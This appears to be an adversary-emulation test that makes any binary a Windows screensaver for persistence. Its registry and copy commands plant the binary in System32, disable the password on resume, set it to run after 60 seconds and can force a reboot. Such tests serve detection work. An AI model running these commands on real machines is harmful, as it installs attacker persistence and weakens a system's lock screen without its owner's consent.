name: Set Arbitrary Binary as Screensaver
description: This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.

data.command:
reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg
copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
if #{reboot} NEQ 0 shutdown /r /t 0

input_arguments.name: input_binary
input_arguments.description: Executable binary to use in place of screensaver for persistence

input_arguments.name: reboot
input_arguments.description: Set to non-zero value if you want the test to reboot the system so that changes take effect
